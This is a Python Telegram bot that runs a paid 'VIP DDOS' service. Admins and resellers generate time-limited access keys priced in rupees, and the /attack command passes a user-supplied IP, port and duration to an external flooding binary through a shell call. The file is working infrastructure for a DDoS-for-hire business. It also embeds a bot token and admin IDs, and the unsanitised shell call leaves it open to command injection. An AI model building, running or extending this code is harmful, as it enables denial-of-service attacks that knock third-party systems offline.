import os
import json
import time
import random
import string
import telebot
import datetime
import subprocess
import threading
from dateutil.relativedelta import relativedelta

# Telegram bot token
bot = telebot.TeleBot('7520138270:AAHHDBRvhGZEXXwVJnSdXt-iLZuxrLzTAgo')  # Replace with your bot token

# Admin user IDs
admin_id = {"1807014348","898181945","6258297180","6955279265"}  # Replace with your admin Telegram ID

# Files for data storage
USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"
RESELLERS_FILE = "resellers.json"

# Per key cost for resellers
KEY_COST = {"1hour": 10, "1day": 100, "7days": 450, "1month": 900}

# In-memory storage
users = {}
keys = {}
last_attack_time = {}
COOLDOWN_PERIOD = 60  # Default cooldown period in seconds

def set_cooldown(seconds):
    """Set the global cooldown period."""
    global COOLDOWN_PERIOD
    COOLDOWN_PERIOD = seconds
    with open("cooldown.json", "w") as file:
        json.dump({"cooldown": seconds}, file)

def load_cooldown():
    """Load the cooldown period from file."""
    global COOLDOWN_PERIOD
    try:
        with open("cooldown.json", "r") as file:
            data = json.load(file)
            COOLDOWN_PERIOD = data.get("cooldown", 60)
    except FileNotFoundError:
        COOLDOWN_PERIOD = 60

# Load data
def load_data():
    global users, keys
    users = read_users()
    keys = read_keys()
    load_cooldown()

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

def read_keys():
    try:
        with open(KEY_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_keys():
    with open(KEY_FILE, "w") as file:
        json.dump(keys, file)

def create_random_key(length=10):
    characters = string.ascii_letters + string.digits
    random_key = ''.join(random.choice(characters) for _ in range(length))
    custom_key = f"ARMY-PK-{random_key.upper()}"
    return custom_key

def add_time_to_current_date(years=0, months=0, days=0, hours=0, minutes=0, seconds=0):
    current_time = datetime.datetime.now()
    new_time = current_time + relativedelta(years=years, months=months, days=days, hours=hours, minutes=minutes, seconds=seconds)
    return new_time

# Load and save resellers
def load_resellers():
    try:
        with open(RESELLERS_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except json.JSONDecodeError:
        return {}

def save_resellers(resellers):
    with open(RESELLERS_FILE, "w") as file:
        json.dump(resellers, file, indent=4)

resellers = load_resellers()

# Attack-related functions
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"UserID: {user_id}"
    with open("log.txt", "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    with open("log.txt", "a") as file:
        log_entry += "\n"
        file.write(log_entry)

def execute_attack(target, port, time, chat_id, username, last_attack_time, user_id):
    try:
        packet_size = 1200
        if packet_size < 1 or packet_size > 65507:
            bot.send_message(chat_id, "Error: Packet size must be between 1 and 65507")
            return
        full_command = f"./Rohan {target} {port} {time} {packet_size}"
        response = f"Attack Sent Successfully\nTarget: {target}:{port}\nTime: {time} seconds\nPacket Size: {packet_size} bytes\nThreads: 512\nAttacker: @{username}"
        bot.send_message(chat_id, response)
        subprocess.Popen(full_command, shell=True)
        threading.Timer(time, send_attack_finished_message, [chat_id]).start()
        last_attack_time[user_id] = datetime.datetime.now()
    except Exception as e:
        bot.send_message(chat_id, f"Error executing attack: {str(e)}")

def send_attack_finished_message(chat_id):
    bot.send_message(chat_id, "Attack completed")

# Admin command to add reseller
@bot.message_handler(commands=['add_reseller'])
def add_reseller(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Only admins can add resellers")
        return
    command = message.text.split()
    if len(command) != 3:
        bot.reply_to(message, "Usage: /add_reseller <user_id> <balance>")
        return
    reseller_id = command[1]
    try:
        initial_balance = int(command[2])
    except ValueError:
        bot.reply_to(message, "Invalid balance amount")
        return
    if reseller_id not in resellers:
        resellers[reseller_id] = initial_balance
        save_resellers(resellers)
        bot.reply_to(message, f"Reseller added successfully\nReseller ID: {reseller_id}\nBalance: {initial_balance} Rs")
    else:
        bot.reply_to(message, f"Reseller {reseller_id} already exists")

# Reseller command to generate keys
@bot.message_handler(commands=['genkey'])
def generate_key(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /genkey <duration>")
        return
    duration = command[1].lower()
    if duration not in KEY_COST:
        bot.reply_to(message, "Invalid duration")
        return
    cost = KEY_COST[duration]
    if user_id in admin_id:
        key = create_random_key()
        keys[key] = {"duration": duration, "expiration_time": None}
        save_keys()
        response = f"Key generated successfully\nKey: `{key}`\nDuration: {duration}"
    elif user_id in resellers:
        if resellers[user_id] >= cost:
            resellers[user_id] -= cost
            save_resellers(resellers)
            key = create_random_key()
            keys[key] = {"duration": duration, "expiration_time": None}
            save_keys()
            response = f"Key generated successfully\nKey: `{key}`\nDuration: {duration}\nCost: {cost} Rs\nRemaining balance: {resellers[user_id]} Rs"
        else:
            response = f"Insufficient balance to generate {duration} key\nRequired: {cost} Rs\nAvailable: {resellers[user_id]} Rs"
    else:
        response = "Access Denied: Admin or reseller only command"
    bot.reply_to(message, response, parse_mode='Markdown')

# Help command
@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "ACCESS DENIED\nThis command is restricted to admins only.", parse_mode='Markdown')
        return
    help_text = """
ULTRA PRO MAX ADMIN PANEL
BOT CONTROLS:
- /start - Start the bot
- /help - Show this guide
POWER MANAGEMENT:
- /attack <ip> <port> <time> - Launch an attack
- /setcooldown <seconds> - Set the attack cooldown period
- /checkcooldown - Check the current cooldown period
- /add_reseller <user_id> <balance> - Add a new reseller
- /genkey <duration> - Generate a key
- /logs - View recent logs
- /users - List authorized users
- /remove <user_id> - Remove a user
- /resellers - View resellers
- /addbalance <reseller_id> <amount> - Add balance to a reseller
- /remove_reseller <reseller_id> - Remove a reseller
EXAMPLE:
- /genkey 1day - Generate a 1-day key
- /attack 192.168.1.1 80 120 - Launch an attack
- /setcooldown 120 - Set cooldown to 120 seconds
- /checkcooldown - View current cooldown
Contact an Admin for guidance
"""
    bot.reply_to(message, help_text, parse_mode='Markdown')

# Reseller balance check
@bot.message_handler(commands=['balance'])
def check_balance(message):
    user_id = str(message.chat.id)
    if user_id in resellers:
        current_balance = resellers[user_id]
        response = f"Your current balance is: {current_balance}."
    else:
        response = "Access Denied: reseller only command"
    bot.reply_to(message, response)

# Redeem key
@bot.message_handler(commands=['redeem'])
def redeem_key_prompt(message):
    bot.reply_to(message, "Please send your key:")
    bot.register_next_step_handler(message, process_redeem_key)

def process_redeem_key(message):
    user_id = str(message.chat.id)
    key = message.text.strip()
    if key in keys:
        if user_id in users:
            current_expiration = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
            if datetime.datetime.now() < current_expiration:
                bot.reply_to(message, "You already have access")
                return
            else:
                del users[user_id]
                save_users()
        duration = keys[key]["duration"]
        if duration == "1hour":
            expiration_time = add_time_to_current_date(hours=1)
        elif duration == "1day":
            expiration_time = add_time_to_current_date(days=1)
        elif duration == "7days":
            expiration_time = add_time_to_current_date(days=7)
        elif duration == "1month":
            expiration_time = add_time_to_current_date(months=1)
        else:
            bot.reply_to(message, "Invalid duration in key.")
            return
        users[user_id] = expiration_time.strftime('%Y-%m-%d %H:%M:%S')
        save_users()
        del keys[key]
        save_keys()
        bot.reply_to(message, f"Access granted\nExpires on: {users[user_id]}")
    else:
        bot.reply_to(message, "Invalid or expired key")

# Show logs
@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                bot.reply_to(message, "No data found")
        else:
            bot.reply_to(message, "No data found")
    else:
        bot.reply_to(message, "Access Denied: Admin only command")

# Start command
@bot.message_handler(commands=['start'])
def start_command(message):
    bot.reply_to(message, "WELCOME TO VIP DDOS\nUse /attack, /redeem, /myinfo, /setcooldown, or /checkcooldown")

# Attack command with admin bypass
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = str(message.chat.id)
    if user_id in admin_id or user_id in users:
        expiration_date = None
        if user_id in users:
            expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')
            if datetime.datetime.now() > expiration_date:
                bot.reply_to(message, "Your access has expired. Contact the admin to renew")
                return
        if user_id in last_attack_time:
            time_since_last_attack = (datetime.datetime.now() - last_attack_time[user_id]).total_seconds()
            if time_since_last_attack < COOLDOWN_PERIOD:
                remaining_cooldown = COOLDOWN_PERIOD - time_since_last_attack
                bot.reply_to(message, f"Cooldown in effect, wait {int(remaining_cooldown)} seconds")
                return
        command = message.text.split()
        if len(command) != 4:
            bot.reply_to(message, "Usage: /attack <ip> <port> <time>")
            return
        target = command[1]
        try:
            port = int(command[2])
            time = int(command[3])
            if time > 240:
                bot.reply_to(message, "Error: use less than 240 seconds")
                return
            record_command_logs(user_id, 'attack', target, port, time)
            log_command(user_id, target, port, time)
            username = message.chat.username or "No username"
            execute_attack(target, port, time, message.chat.id, username, last_attack_time, user_id)
        except ValueError:
            bot.reply_to(message, "Invalid port or time format.")
    else:
        bot.reply_to(message, "Unauthorized Access!\nOWNER: @Pk_Chopra")

# Set cooldown command
@bot.message_handler(commands=['setcooldown'])
def set_cooldown_command(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /setcooldown <seconds>")
        return
    try:
        seconds = int(command[1])
        if seconds < 0:
            bot.reply_to(message, "Cooldown must be non-negative")
            return
        set_cooldown(seconds)
        bot.reply_to(message, f"Cooldown set to {seconds} seconds")
    except ValueError:
        bot.reply_to(message, "Invalid cooldown value. Please provide a number.")

# Check cooldown command
@bot.message_handler(commands=['checkcooldown'])
def check_cooldown_command(message):
    bot.reply_to(message, f"Current cooldown period: {COOLDOWN_PERIOD} seconds")

# My info
@bot.message_handler(commands=['myinfo'])
def my_info(message):
    user_id = str(message.chat.id)
    username = message.chat.username or "No username"
    if user_id in admin_id:
        role = "Admin"
        key_expiration = "No access"
        balance = "Not Applicable"
    elif user_id in resellers:
        role = "Reseller"
        balance = resellers.get(user_id, 0)
        key_expiration = "No access"
    elif user_id in users:
        role = "User"
        key_expiration = users[user_id]
        balance = "Not Applicable"
    else:
        role = "Guest"
        key_expiration = "No active key"
        balance = "Not Applicable"
    response = (
        f"USER INFORMATION\n"
        f"Username: @{username}\n"
        f"UserID: {user_id}\n"
        f"Role: {role}\n"
        f"Expiration: {key_expiration}\n"
    )
    if role == "Reseller":
        response += f"Balance: {balance}\n"
    bot.reply_to(message, response)

# List users
@bot.message_handler(commands=['users'])
def list_authorized_users(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    if users:
        response = "Authorized Users\n"
        for user, expiration in users.items():
            expiration_date = datetime.datetime.strptime(expiration, '%Y-%m-%d %H:%M:%S')
            formatted_expiration = expiration_date.strftime('%Y-%m-%d %H:%M:%S')
            user_info = bot.get_chat(user)
            username = user_info.username if user_info.username else user_info.first_name
            response += f"User ID: {user}\nUsername: @{username}\nExpires On: {formatted_expiration}\n"
    else:
        response = "No authorized users found."
    bot.reply_to(message, response, parse_mode='Markdown')

# Remove user
@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /remove <User_ID>")
        return
    target_user_id = command[1]
    if target_user_id in users:
        del users[target_user_id]
        save_users()
        response = f"User {target_user_id} has been successfully removed"
    else:
        response = f"User {target_user_id} is not in the authorized users list"
    bot.reply_to(message, response)

# Show resellers
@bot.message_handler(commands=['resellers'])
def show_resellers(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        resellers_info = "Authorized Resellers\n"
        if resellers:
            for reseller_id, balance in resellers.items():
                reseller_username = bot.get_chat(reseller_id).username if bot.get_chat(reseller_id) else "Unknown"
                resellers_info += f"Username: {reseller_username}\nUserID: {reseller_id}\nBalance: {balance} Rs\n"
        else:
            resellers_info += "No reseller found"
        bot.reply_to(message, resellers_info)
    else:
        bot.reply_to(message, "Access Denied: Admin only command")

# Add balance
@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command_parts = message.text.split()
        if len(command_parts) != 3:
            bot.reply_to(message, "Usage: /addbalance <reseller_id> <amount>")
            return
        reseller_id = command_parts[1]
        try:
            amount = float(command_parts[2])
            if reseller_id not in resellers:
                bot.reply_to(message, "Reseller ID not found")
                return
            resellers[reseller_id] += amount
            save_resellers(resellers)
            bot.reply_to(message, f"Balance Successfully added\nBalance: {amount} Rs\nReseller ID: {reseller_id}\nNew balance: {resellers[reseller_id]} Rs")
        except ValueError:
            bot.reply_to(message, "Invalid amount")
    else:
        bot.reply_to(message, "Access Denied: Admin only command")

# Remove reseller
@bot.message_handler(commands=['remove_reseller'])
def remove_reseller(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command_parts = message.text.split()
        if len(command_parts) != 2:
            bot.reply_to(message, "Usage: /remove_reseller <reseller_id>")
            return
        reseller_id = command_parts[1]
        if reseller_id not in resellers:
            bot.reply_to(message, "Reseller ID not found.")
            return
        del resellers[reseller_id]
        save_resellers(resellers)
        bot.reply_to(message, f"Reseller {reseller_id} has been removed successfully")
    else:
        bot.reply_to(message, "Access Denied: Admin only command")

if __name__ == "__main__":
    load_data()
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(e)
            time.sleep(1)